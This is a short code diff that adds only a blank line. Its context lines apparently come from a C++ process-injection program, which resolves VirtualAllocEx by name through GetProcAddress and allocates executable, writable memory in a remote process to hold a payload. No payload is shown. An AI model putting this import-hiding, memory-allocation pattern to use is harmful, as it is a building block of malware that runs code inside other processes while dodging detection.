@@ -160,6 +160,7 @@ int main(int argc, char* argv[]){
     // Get module handle of kernel32.dll
     
     // use virtualallocex to allocate empty buffer on remote process
+
     pVirtualAllocEx myVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, StrVirtualAlloc.c_str());
     rb = myVirtualAllocEx(ph, NULL, sizeof(payload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 
